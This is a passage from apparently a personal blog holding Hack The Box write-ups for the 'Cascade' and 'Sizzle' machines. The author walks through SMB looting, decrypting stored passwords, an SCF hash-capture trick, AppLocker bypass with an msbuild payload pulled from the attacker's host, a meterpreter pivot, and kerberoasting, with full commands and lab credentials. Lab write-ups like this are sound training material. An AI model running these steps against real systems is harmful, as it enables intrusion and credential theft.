Enumerated shares SMB 10.10.10.182 445 CASC-DC1 Share Permissions Remark SMB 10.10.10.182 445 CASC-DC1 ----- ----------- ------ SMB 10.10.10.182 445 CASC-DC1 ADMIN$ Remote Admin SMB 10.10.10.182 445 CASC-DC1 Audit$ SMB 10.10.10.182 445 CASC-DC1 C$ Default share SMB 10.10.10.182 445 CASC-DC1 Data READ SMB 10.10.10.182 445 CASC-DC1 IPC$ Remote IPC SMB 10.10.10.182 445 CASC-DC1 NETLOGON READ Logon server share SMB 10.10.10.182 445 CASC-DC1 print$ READ Printer Drivers SMB 10.10.10.182 445 CASC-DC1 SYSVOL READ Logon server share SPIDER_PLUS 10.10.10.182 445 CASC-DC1 [+] Saved share-file metadata to \u0026#34;/tmp/nxc_hosted/nxc_spider_plus/10.10.10.182.json\u0026#34;. SPIDER_PLUS 10.10.10.182 445 CASC-DC1 [*] SMB Shares: 8 (ADMIN$, Audit$, C$, Data, IPC$, NETLOGON, print$, SYSVOL) SPIDER_PLUS 10.10.10.182 445 CASC-DC1 [*] SMB Readable Shares: 4 (Data, NETLOGON, print$, SYSVOL) SPIDER_PLUS 10.10.10.182 445 CASC-DC1 [*] SMB Filtered Shares: 1 SPIDER_PLUS 10.10.10.182 445 CASC-DC1 [*] Total folders found: 58 SPIDER_PLUS 10.10.10.182 445 CASC-DC1 [*] Total files found: 20 SPIDER_PLUS 10.10.10.182 445 CASC-DC1 [*] File size average: 1.07 KB SPIDER_PLUS 10.10.10.182 445 CASC-DC1 [*] File size min: 6 B SPIDER_PLUS 10.10.10.182 445 CASC-DC1 [*] File size max: 5.83 KB I connect on network share named Data and collect all the content.\n\u0026gt; smbclient //10.10.10.182/data -U \u0026#39;cascade.local/r.thompson%rY4n5eva\u0026#39; smb: \\\u0026gt; recurse on smb: \\\u0026gt; prompt off smb: \\\u0026gt; mget * NT_STATUS_ACCESS_DENIED listing \\Contractors\\* NT_STATUS_ACCESS_DENIED listing \\Finance\\* NT_STATUS_ACCESS_DENIED listing \\Production\\* NT_STATUS_ACCESS_DENIED listing \\Temps\\* getting file \\IT\\Email Archives\\Meeting_Notes_June_2018.html of size 2522 as IT/Email Archives/Meeting_Notes_June_2018.html (29.0 KiloBytes/sec) (average 29.0 KiloBytes/sec) getting file \\IT\\Logs\\Ark AD Recycle Bin\\ArkAdRecycleBin.log of size 1303 as IT/Logs/Ark AD Recycle Bin/ArkAdRecycleBin.log (13.8 KiloBytes/sec) (average 21.1 KiloBytes/sec) getting file \\IT\\Logs\\DCs\\dcdiag.log of size 5967 as IT/Logs/DCs/dcdiag.log (70.2 KiloBytes/sec) (average 36.8 KiloBytes/sec) getting file \\IT\\Temp\\s.smith\\VNC Install.reg of size 2680 as IT/Temp/s.smith/VNC Install.reg (30.1 KiloBytes/sec) (average 35.1 KiloBytes/sec) Among all these files I take note of a user named TempAdmin, this users, which would have been deleted by Arksvc seems to have administrator rights, moreover in the Email Archives note it is said that he has the same password as an Administrator account, interresting‚Ä¶\n\u0026gt; cat /IT/Logs/\u0026#34;Ark AD Recycle Bin\u0026#34;/ArkAdRecycleBin.log 1/10/2018 15:43 [MAIN_THREAD] ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 ** 1/10/2018 15:43 [MAIN_THREAD] Validating settings... 1/10/2018 15:43 [MAIN_THREAD] Error: Access is denied 1/10/2018 15:43 [MAIN_THREAD] Exiting with error code 5 2/10/2018 15:56 [MAIN_THREAD] ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 ** 2/10/2018 15:56 [MAIN_THREAD] Validating settings... 2/10/2018 15:56 [MAIN_THREAD] Running as user CASCADE\\ArkSvc 2/10/2018 15:56 [MAIN_THREAD] Moving object to AD recycle bin CN=Test,OU=Users,OU=UK,DC=cascade,DC=local 2/10/2018 15:56 [MAIN_THREAD] Successfully moved object. New location CN=Test\\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local 2/10/2018 15:56 [MAIN_THREAD] Exiting with error code 0 8/12/2018 12:22 [MAIN_THREAD] ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 ** 8/12/2018 12:22 [MAIN_THREAD] Validating settings... 8/12/2018 12:22 [MAIN_THREAD] Running as user CASCADE\\ArkSvc 8/12/2018 12:22 [MAIN_THREAD] Moving object to AD recycle bin CN=TempAdmin,OU=Users,OU=UK,DC=cascade,DC=local 8/12/2018 12:22 [MAIN_THREAD] Successfully moved object. New location CN=TempAdmin\\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local 8/12/2018 12:22 [MAIN_THREAD] Exiting with error code 0 If you pay more attention to the ArkSvc user I can see that it is part of the AD Recycle Bin group. members of this group are allows for the reading of deleted Active Directory objects.\n\u0026gt; nxc ldap 10.10.10.182 -u r.thompson -p rY4n5eva --query \u0026#34;(sAMAccountName=ArkSvc)\u0026#34; \u0026#34;memberOf\u0026#34; LDAP 10.10.10.182 389 CASC-DC1 memberOf: CN=Remote Management Users,OU=Groups,OU=UK,DC=cascade,DC=local CN=AD Recycle Bin,OU=Groups,OU=UK,DC=cascade,DC=local CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local But before that I still have to search in the files that I recovered in the share, I find a file named VNC Install.reg and in this file it finds a value in hexa in a variable named Password.\n\u0026gt; cat \u0026#34;VNC Install.reg\u0026#34; --- \u0026#34;Password\u0026#34;=hex:6b,cf,2a,4b,6e,5a,ca,0f --- I‚Äôm looking for how to rip this data and I come across this article on the internet.\nComment d√©chiffrer les mots de passe VNC\nTo find the data in clear just do the linux command given in the blog.\n\u0026gt; echo -n \u0026lt;HEXA_VALUE\u0026gt; | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv 00000000 73 54 33 33 33 76 65 32 |sT333ve2| 00000008 It would seem that we have found s.smith password, we can valid the credential with nxc.\n\u0026gt; nxc ldap 10.10.10.182 -u s.smith -p sT333ve2 -M whoami SMB 10.10.10.182 445 CASC-DC1 [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False) LDAP 10.10.10.182 389 CASC-DC1 [+] cascade.local\\s.smith:sT333ve2 WHOAMI 10.10.10.182 389 CASC-DC1 distinguishedName: CN=Steve Smith,OU=Users,OU=UK,DC=cascade,DC=local WHOAMI 10.10.10.182 389 CASC-DC1 Member of: CN=Audit Share,OU=Groups,OU=UK,DC=cascade,DC=local WHOAMI 10.10.10.182 389 CASC-DC1 Member of: CN=Remote Management Users,OU=Groups,OU=UK,DC=cascade,DC=local WHOAMI 10.10.10.182 389 CASC-DC1 Member of: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local WHOAMI 10.10.10.182 389 CASC-DC1 name: Steve Smith WHOAMI 10.10.10.182 389 CASC-DC1 Enabled: Yes WHOAMI 10.10.10.182 389 CASC-DC1 Password Never Expires: Yes WHOAMI 10.10.10.182 389 CASC-DC1 Last logon: 132247275990842339 WHOAMI 10.10.10.182 389 CASC-DC1 pwdLastSet: 132247150854857364 WHOAMI 10.10.10.182 389 CASC-DC1 logonCount: 16 WHOAMI 10.10.10.182 389 CASC-DC1 sAMAccountName: s.smith This user is part of groupe Remote Management Users that meen we can open Powershell session with winrm.\n\u0026gt; evil-winrm -u s.smith -p sT333ve2 -i 10.10.10.182 Windows Binary reversing : # with this new user i can connect on the network share named Audit$ lets open the shell with smblcient.\n\u0026gt; smbclient //10.10.10.182/Audit$ -U \u0026#39;cascade.local/s.smith%sT333ve2\u0026#39; Download all the content, In everything we have recover there is a program windows, this program is CascAudit, there are also quite a few librairi file .dll that accompanies it.\nWell I‚Äôm not really strong in reverse so I used a tool that will do everything for me this tool is called DnsPy\nthanks to DnSpy I can decompile the .NET program to find pieces of code of the program that are interesting.\nCascAudit.exe :\npublic static void Main() { if (MyProject.Application.CommandLineArgs.Count != 1) { Console.WriteLine(\u0026#34;Invalid number of command line args specified. Must specify database path only\u0026#34;); return; } checked { using (SQLiteConnection sqliteConnection = new SQLiteConnection(\u0026#34;Data Source=\u0026#34; + MyProject.Application.CommandLineArgs[0] + \u0026#34;;Version=3;\u0026#34;)) { string str = string.Empty; string password = string.Empty; string str2 = string.Empty; try { sqliteConnection.Open(); using (SQLiteCommand sqliteCommand = new SQLiteCommand(\u0026#34;SELECT * FROM LDAP\u0026#34;, sqliteConnection)) { using (SQLiteDataReader sqliteDataReader = sqliteCommand.ExecuteReader()) { sqliteDataReader.Read(); str = Conversions.ToString(sqliteDataReader[\u0026#34;Uname\u0026#34;]); str2 = Conversions.ToString(sqliteDataReader[\u0026#34;Domain\u0026#34;]); string encryptedString = Conversions.ToString(sqliteDataReader[\u0026#34;Pwd\u0026#34;]); try { password = Crypto.DecryptString(encryptedString, \u0026#34;c4scadek3y654321\u0026#34;); } catch (Exception ex) { Console.WriteLine(\u0026#34;Error decrypting password: \u0026#34; + ex.Message); return; } } } sqliteConnection.Close(); } catch (Exception ex2) { Console.WriteLine(\u0026#34;Error getting LDAP connection data From database: \u0026#34; + ex2.Message); return; } int num = 0; using (DirectoryEntry directoryEntry = new DirectoryEntry()) { directoryEntry.Username = str2 + \u0026#34;\\\\\u0026#34; + str; directoryEntry.Password = password; directoryEntry.AuthenticationType = AuthenticationTypes.Secure; using (DirectorySearcher directorySearcher = new DirectorySearcher(directoryEntry)) { directorySearcher.Tombstone = true; directorySearcher.PageSize = 1000; directorySearcher.Filter = \u0026#34;(\u0026amp;(isDeleted=TRUE)(objectclass=user))\u0026#34;; directorySearcher.PropertiesToLoad.AddRange(new string[] { \u0026#34;cn\u0026#34;, \u0026#34;sAMAccountName\u0026#34;, \u0026#34;distinguishedName\u0026#34; }); using (SearchResultCollection searchResultCollection = directorySearcher.FindAll()) { Console.WriteLine(\u0026#34;Found \u0026#34; + Conversions.ToString(searchResultCollection.Count) + \u0026#34; results from LDAP query\u0026#34;); sqliteConnection.Open(); try { try { foreach (object obj in searchResultCollection) { SearchResult searchResult = (SearchResult)obj; string text = string.Empty; string text2 = string.Empty; string text3 = string.Empty; if (searchResult.Properties.Contains(\u0026#34;cn\u0026#34;)) { text = Conversions.ToString(searchResult.Properties[\u0026#34;cn\u0026#34;][0]); } if (searchResult.Properties.Contains(\u0026#34;sAMAccountName\u0026#34;)) { text2 = Conversions.ToString(searchResult.Properties[\u0026#34;sAMAccountName\u0026#34;][0]); } if (searchResult.Properties.Contains(\u0026#34;distinguishedName\u0026#34;)) { text3 = Conversions.ToString(searchResult.Properties[\u0026#34;distinguishedName\u0026#34;][0]); } using (SQLiteCommand sqliteCommand2 = new SQLiteCommand(\u0026#34;INSERT INTO DeletedUserAudit (Name,Username,DistinguishedName) VALUES (@Name,@Username,@Dn)\u0026#34;, sqliteConnection)) { sqliteCommand2.Parameters.AddWithValue(\u0026#34;@Name\u0026#34;, text); sqliteCommand2.Parameters.AddWithValue(\u0026#34;@Username\u0026#34;, text2); sqliteCommand2.Parameters.AddWithValue(\u0026#34;@Dn\u0026#34;, text3); num += sqliteCommand2.ExecuteNonQuery(); } } } finally { IEnumerator enumerator; if (enumerator is IDisposable) { (enumerator as IDisposable).Dispose(); } } } finally { sqliteConnection.Close(); Console.WriteLine(\u0026#34;Successfully inserted \u0026#34; + Conversions.ToString(num) + \u0026#34; row(s) into database\u0026#34;); } } } } } } } CascCrypto.dll Fonction DecryptString:\npublic static string DecryptString(string EncryptedString, string Key) { byte[] array = Convert.FromBase64String(EncryptedString); Aes aes = Aes.Create(); aes.KeySize = 128; aes.BlockSize = 128; aes.IV = Encoding.UTF8.GetBytes(\u0026#34;1tdyjCbY1Ix49842\u0026#34;); aes.Mode = CipherMode.CBC; aes.Key = Encoding.UTF8.GetBytes(Key); string @string; using (MemoryStream memoryStream = new MemoryStream(array)) { using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Read)) { byte[] array2 = new byte[checked(array.Length - 1 + 1)]; cryptoStream.Read(array2, 0, array2.Length); @string = Encoding.UTF8.GetString(array2); } } return @string; } Roughly this code is quite interesting because it contains a lot of interesting information including the encryption recipe for the password in a database related to the program. I look in the other file download and I come across a given db file, lets dump the entire content.\n\u0026gt; sqlite3 Audit.db # DUMP ENTIRE DB sqlite\u0026gt; .dump PRAGMA foreign_keys=OFF; BEGIN TRANSACTION; CREATE TABLE IF NOT EXISTS \u0026#34;Ldap\u0026#34; ( \u0026#34;Id\u0026#34; INTEGER PRIMARY KEY AUTOINCREMENT, \u0026#34;uname\u0026#34; TEXT, \u0026#34;pwd\u0026#34; TEXT, \u0026#34;domain\u0026#34; TEXT ); INSERT INTO Ldap VALUES(1,\u0026#39;ArkSvc\u0026#39;,\u0026#39;BQO5l5Kj9MdErXx6Q6AGOw==\u0026#39;,\u0026#39;cascade.local\u0026#39;); CREATE TABLE IF NOT EXISTS \u0026#34;Misc\u0026#34; ( \u0026#34;Id\u0026#34; INTEGER PRIMARY KEY AUTOINCREMENT, \u0026#34;Ext1\u0026#34; TEXT, \u0026#34;Ext2\u0026#34; TEXT ); CREATE TABLE IF NOT EXISTS \u0026#34;DeletedUserAudit\u0026#34; ( \u0026#34;Id\u0026#34; INTEGER PRIMARY KEY AUTOINCREMENT, \u0026#34;Username\u0026#34; TEXT, \u0026#34;Name\u0026#34; TEXT, \u0026#34;DistinguishedName\u0026#34; TEXT ); INSERT INTO DeletedUserAudit VALUES(6,\u0026#39;test\u0026#39;,replace(\u0026#39;Test\\nDEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d\u0026#39;,\u0026#39;\\n\u0026#39;,char(10)),\u0026#39;CN=Test\\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local\u0026#39;); INSERT INTO DeletedUserAudit VALUES(7,\u0026#39;deleted\u0026#39;,replace(\u0026#39;deleted guy\\nDEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef\u0026#39;,\u0026#39;\\n\u0026#39;,char(10)),\u0026#39;CN=deleted guy\\0ADEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef,CN=Deleted Objects,DC=cascade,DC=local\u0026#39;); INSERT INTO DeletedUserAudit VALUES(9,\u0026#39;TempAdmin\u0026#39;,replace(\u0026#39;TempAdmin\\nDEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a\u0026#39;,\u0026#39;\\n\u0026#39;,char(10)),\u0026#39;CN=TempAdmin\\0ADEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a,CN=Deleted Objects,DC=cascade,DC=local\u0026#39;); DELETE FROM sqlite_sequence; INSERT INTO sqlite_sequence VALUES(\u0026#39;Ldap\u0026#39;,2); INSERT INTO sqlite_sequence VALUES(\u0026#39;DeletedUserAudit\u0026#39;,10); COMMIT; I find the value of the variable pwd that we also find in the code of CascAudit.exe, with all this information I can decrypt the data. I tried to do in python but for a reason I don‚Äôt know that I can not do so I went on the site https://www.devglan.com/online-tools/aes-encryption-decryption to do that.\ntry the password we found with the ArkSvc user\n\u0026gt; nxc smb 10.10.10.182 -u ArkSvc -p w3lc0meFr31nd SMB 10.10.10.182 445 CASC-DC1 [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False) SMB 10.10.10.182 445 CASC-DC1 [+] cascade.local\\ArkSvc:w3lc0meFr31nd Abuse AD Recyble Bin SecuGroup : # As we know ArkSvc is a member of the group Remote Management Users so I can log in powershell with winrm.\n\u0026gt; evil-winrm -u ArkSvc -p w3lc0meFr31nd -i 10.10.10.182 Now I can abuse the AS Recycle Bin group to dump information about objects deleted from the AD, especially the TempAdmin user.\nGet-ADObject -filter \u0026#39;isDeleted -eq $true\u0026#39; -includeDeletedObjects -Properties * | # TempAdmin PART accountExpires : 9223372036854775807 badPasswordTime : 0 badPwdCount : 0 CanonicalName : cascade.local/Deleted Objects/TempAdmin DEL:f0cc344d-31e0-4866-bceb-a842791ca059 cascadeLegacyPwd : YmFDVDNyMWFOMDBkbGVz CN : TempAdmin DEL:f0cc344d-31e0-4866-bceb-a842791ca059 codePage : 0 countryCode : 0 Created : 1/27/2020 3:23:08 AM createTimeStamp : 1/27/2020 3:23:08 AM Deleted : True Description : DisplayName : TempAdmin DistinguishedName : CN=TempAdmin\\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local dSCorePropagationData : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM} givenName : TempAdmin instanceType : 4 isDeleted : True LastKnownParent : OU=Users,OU=UK,DC=cascade,DC=local lastLogoff : 0 lastLogon : 0 logonCount : 0 Modified : 1/27/2020 3:24:34 AM modifyTimeStamp : 1/27/2020 3:24:34 AM msDS-LastKnownRDN : TempAdmin Name : TempAdmin DEL:f0cc344d-31e0-4866-bceb-a842791ca059 nTSecurityDescriptor : System.DirectoryServices.ActiveDirectorySecurity ObjectCategory : ObjectClass : user ObjectGUID : f0cc344d-31e0-4866-bceb-a842791ca059 objectSid : S-1-5-21-3332504370-1206983947-1165150453-1136 primaryGroupID : 513 ProtectedFromAccidentalDeletion : False pwdLastSet : 132245689883479503 sAMAccountName : TempAdmin sDRightsEffective : 0 userAccountControl : 66048 userPrincipalName : TempAdmin@cascade.local uSNChanged : 237705 uSNCreated : 237695 whenChanged : 1/27/2020 3:24:34 AM whenCreated : 1/27/2020 3:23:08 AM The cascadeLegacyPwd attribute that we found in the beginning of the machine is again here on this Users. we can decode the data as before.\n\u0026gt; echo YmFDVDNyMWFOMDBkbGVz | base64 -d baCT3r1aN00dles In logic this password should be the same for the domain administrator.\n\u0026gt; nxc smb 10.10.10.182 -u Administrator -p baCT3r1aN00dles SMB 10.10.10.182 445 CASC-DC1 [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False) SMB 10.10.10.182 445 CASC-DC1 [+] cascade.local\\Administrator:baCT3r1aN00dles (Pwn3d!) Lets GOO We Are D.A Now ! ü§©\nRessources : # LDAP Query with nxc : https://www.netexec.wiki/ldap-protocol/query-ldap\nDecrypt VNC Password : https://blog.pascal-mietlicki.fr/comment-dechiffrer-les-mots-de-passe-vnc/\nAbuse AD Recyble Bin Group : https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview#deleted-objects\n","date":"8 July 2024","externalUrl":null,"permalink":"/posts/cascade/","section":"Posts","summary":"","title":"HTB Cascade - Medium","type":"posts"},{"content":" Scanning : # Run nmap scan to get open ports and services.\n\u0026gt; nmap -sV -sC -T4 -Pn 10.10.10.103 21/tcp open ftp Microsoft ftpd | ftp-syst: |_ SYST: Windows_NT |_ftp-anon: Anonymous FTP login allowed (FTP code 230) 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-title: Site doesn\u0026#39;t have a title (text/html). |_http-server-header: Microsoft-IIS/10.0 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name) |_ssl-date: 2024-05-01T15:40:11+00:00; +4s from scanner time. | ssl-cert: Subject: commonName=sizzle.htb.local | Not valid before: 2018-07-03T17:58:55 |_Not valid after: 2020-07-02T17:58:55 443/tcp open ssl/http Microsoft IIS httpd 10.0 | tls-alpn: | h2 |_ http/1.1 |_http-title: Site doesn\u0026#39;t have a title (text/html). | http-methods: |_ Potentially risky methods: TRACE | ssl-cert: Subject: commonName=sizzle.htb.local | Not valid before: 2018-07-03T17:58:55 |_Not valid after: 2020-07-02T17:58:55 |_ssl-date: 2024-05-01T15:40:11+00:00; +4s from scanner time. |_http-server-header: Microsoft-IIS/10.0 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap |_ssl-date: 2024-05-01T15:40:11+00:00; +4s from scanner time. | ssl-cert: Subject: commonName=sizzle.htb.local | Not valid before: 2018-07-03T17:58:55 |_Not valid after: 2020-07-02T17:58:55 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name) |_ssl-date: 2024-05-01T15:40:11+00:00; +4s from scanner time. | ssl-cert: Subject: commonName=sizzle.htb.local | Not valid before: 2018-07-03T17:58:55 |_Not valid after: 2020-07-02T17:58:55 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=sizzle.htb.local | Not valid before: 2018-07-03T17:58:55 |_Not valid after: 2020-07-02T17:58:55 |_ssl-date: 2024-05-01T15:40:11+00:00; +4s from scanner time. Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required |_clock-skew: mean: 3s, deviation: 0s, median: 3s | smb2-time: | date: 2024-05-01T15:39:33 |_ start_date: 2024-05-01T15:36:08 This machine was a domaine controleur, we need to add the domain and the FQDN to yout /etc/hosts.\n\u0026gt; echo \u0026#34;10.10.10.103 sizzle.htb.local htb.local\u0026#34; \u0026gt;\u0026gt; /etc/hosts Enumerat SMB : # I always start with the smb service so lets try to connect on it using null session or Guest session.\nOk i can log in with Guest and null session i try to enumerate the share also with cme.\n\u0026gt; crackmapexec smb 10.10.10.103 -u \u0026#39;Guest\u0026#39; -p \u0026#39;\u0026#39; --shares SMB 10.10.10.103 445 SIZZLE [*] Windows 10.0 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:False) SMB 10.10.10.103 445 SIZZLE [+] HTB.LOCAL\\Guest: SMB 10.10.10.103 445 SIZZLE [+] Enumerated shares SMB 10.10.10.103 445 SIZZLE Share Permissions Remark SMB 10.10.10.103 445 SIZZLE ----- ----------- ------ SMB 10.10.10.103 445 SIZZLE ADMIN$ Remote Admin SMB 10.10.10.103 445 SIZZLE C$ Default share SMB 10.10.10.103 445 SIZZLE CertEnroll Active Directory Certificate Services share SMB 10.10.10.103 445 SIZZLE Department Shares READ SMB 10.10.10.103 445 SIZZLE IPC$ READ Remote IPC SMB 10.10.10.103 445 SIZZLE NETLOGON Logon server share SMB 10.10.10.103 445 SIZZLE Operations SMB 10.10.10.103 445 SIZZLE SYSVOL Logon server share The Guest user have access on a share named Department Shares lets get all of it content.\n\u0026gt; smbclient \\\\\\\\sizzle.htb.local\\\\\u0026#34;Department Shares\u0026#34; -U Guest # get all the content and analyse it localy \u0026gt; recuse on \u0026gt; prompte off \u0026gt; mget * I try to enumerate domain user with rid brute force and i can this users.\n\u0026gt; crackmapexec smb 10.10.10.103 -u \u0026#39;Guest\u0026#39; -p \u0026#39;\u0026#39; --rid-brute 10000 # Users list SIZZLE$ amanda mrlky sizzler Administrator krbtgt SCF file Attack : # So go back on the smb service i have acces on lot of share lets try to enumerate all the permission on it.\nI find i can put some file on the smb share Users/Public.\n\u0026gt; smbcacls -N \\\\\\\\sizzle.htb.local\\\\\u0026#34;Department Shares\u0026#34; Users/Public REVISION:1 CONTROL:SR|DI|DP OWNER:BUILTIN\\Administrators GROUP:HTB\\Domain Users ACL:Everyone:ALLOWED/OI|CI/FULL ACL:S-1-5-21-2379389067-1826974543-3574127760-1000:ALLOWED/OI|CI|I/FULL ACL:BUILTIN\\Administrators:ALLOWED/OI|CI|I/FULL ACL:Everyone:ALLOWED/OI|CI|I/READ ACL:NT AUTHORITY\\SYSTEM:ALLOWED/OI|CI|I/FULL When we can put some file on windows environnement i can try SCF File attack to steal NTLMv2 of domain user ( if the user open my malicious file ).\nCreate a file named @exploit.scf and paste this on it.\n[Shell] Command=2 IconFile=\\\\10.10.14.52\\share\\test.ico [Taskbar] Command=ToggleDesktop now open responder and put the malicious file on the Users/Public Folder.\n# Open responder \u0026gt; responder -I tun0 # put the file on folder \u0026gt; put @exploit.scf wait for connection. ( You can find this hash in /usr/share/reponder/logs )\nWe Get connection and steal the hash for amanda user. Lets try to crack the ntlmv2 hash.\n\u0026gt; hashcat -a 0 -m 5600 amanda.txt /usr/share/wordlists/rockyou.txt AMANDA::HTB:091314b0e760d6a0:9fa3258c3d31e52b901c3e660c6789bc:0101000000000000003c42639b9cda011fdde6c2ade7b9750000000002000800370056004c00310001001e00570049004e002d00550042005a004f00500041005900510049005400340004003400570049004e002d00550042005a004f0050004100590051004900540034002e00370056004c0031002e004c004f00430041004c0003001400370056004c0031002e004c004f00430041004c0005001400370056004c0031002e004c004f00430041004c0007000800003c42639b9cda0106000400020000000800300030000000000000000100000000200000755086bc236af9cd7481624a18dac4dde03f51d3563a68ecb9529899aa08ed390a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0035003200000000000000000000000000:Ashare1972 Use CME to valid the credentials and get the first access on the domain.\n\u0026gt; crackmapexec smb 10.10.10.103 -u \u0026#39;amanda\u0026#39; -p \u0026#39;Ashare1972\u0026#39; SMB 10.10.10.103 445 SIZZLE [*] Windows 10.0 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:False) SMB 10.10.10.103 445 SIZZLE [+] HTB.LOCAL\\amanda:Ashare1972 With this user we can get access on the network share named CertEnroll.\n\u0026gt; smbclient -N \\\\\\\\sizzle.htb.local\\\\\u0026#34;CertEnroll\u0026#34; -U \u0026#39;amanda%Ashare1972\u0026#39; # Get all the content smb: \\\u0026gt; prompt off smb: \\\u0026gt; recurse on smb: \\\u0026gt; mget * I try some domain enumeration with bloodhound.\n\u0026gt; bloodhound-python -d HTB.local -u amanda -p \u0026#39;Ashare1972\u0026#39; -dc sizzle.htb.local -ns 10.10.10.103 --auth-method ntlm -c all I see amanda is part of group REMOTE MANAGEMENT USERS\nAbuse ADCS to get PSremote session : # So we could login the server with winrm and get a shell as amanda**.**\n\u0026gt; evil-winrm -i sizzle.htb.local -u amanda -p \u0026#39;Ashare1972\u0026#39; But i get an error So a return on my content of the network share, this file containt .crl file that so this makes me think of an ADCS service and the network sharing name I thought I should try to access the ADCS web utility\nOn url add /sertsrv You can authenticate on the service using amanda credentials.\nWith this interface we are able de generate a user certificat signed by the CA authority. First we need a certificat request ( .csr file ) we could generate it with openssl.\n\u0026gt; openssl req -newkey rsa:2048 -keyout amanda.key -out amanda.csr # Paye close attention to this part Common Name (e.g. server FQDN or YOUR name) []:sizzle.htb.local when this is done copy the content of the .csr and go to the ADCS web interface.\nClick on request a certificate ‚áí advanced certificate request , Paste the content of the .csr file and click on submit.\nDownlaod the certificate and us it to login using evil-winrm and open a PSremote session.\n\u0026gt; evil-winrm -i 10.10.10.103 -c certnew.cer -k amanda.key -S Bypass Applocker and defender : # So i re take my bloodhound graph and i see the user mrlky is vulnerable to kerberoasting because it have SPN set.\nIt is confirmed by GetUserSPNs from impacket.\n\u0026gt; impacket-GetUserSPNs HTB.local/amanda:\u0026#39;Ashare1972\u0026#39; -dc-ip 10.10.10.103 Impacket v0.11.0 - Copyright 2023 Fortra ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation -------------------- ----- ----------------------------------------------------- -------------------------- -------------------------- ---------- http/sizzle mrlky CN=Remote Management Users,CN=Builtin,DC=HTB,DC=LOCAL 2018-07-10 14:08:09.536421 2018-07-12 10:23:50.871575 But the kerberos port is filtered so that meen we can not get Service Ticket or TGT from linux.\n\u0026gt; nmap -p88 10.10.10.103 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-03 07:32 EDT Nmap scan report for sizzle.htb.local (10.10.10.103) Host is up (0.021s latency). PORT STATE SERVICE 88/tcp filtered kerberos-sec So i need to do portfowarding or pivoting to get access on this port. But the applocker block my chisel binary and it block powerview script.\nSo i will generate a payload using GreatSCT to bypass it.\n\u0026gt; ./GreatSCT.py \u0026gt; use 9 \u0026gt; set lhost 10.10.14.52 \u0026gt; generate Start metasploit with .rc file.\n\u0026gt; msfconsole -r \u0026lt;FILE\u0026gt;.rc Upload the malicious binary and run it.\n\u0026gt; Invoke-WebRequest -URI http://10.10.14.52:800/rev.xml -OutFile rev.xml # run with msbuild.exe \u0026gt; C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe rev.xml Exploit Kerberoasting : # With the meterpreter session i will be able to made pivoting with the meterpreter module and configure socks proxy.\n# On msfconsole \u0026gt; use server/socks_proxy \u0026gt; route add 10.10.10.0 255.255.255.0 \u0026lt;SESSION_NUMBER\u0026gt; \u0026gt; exploit Your /etc/proxychains.conf file must point to port 1080.\nsocks5 127.0.0.1 1080 Now we are able to run kerberoasting from linux with impacket tool.\n\u0026gt; proxychains impacket-GetUserSPNs htb.local/amanda:\u0026#39;Ashare1972\u0026#39; -dc-ip 10.10.10.103 -request-user mrlky -target-domain htb.local -outputfile kerberos.txt Crack the TGS with hashcat.\n\u0026gt; hashcat -a 0 -m 13100 kerberos.txt /usr/share/wordlists/rockyou.txt 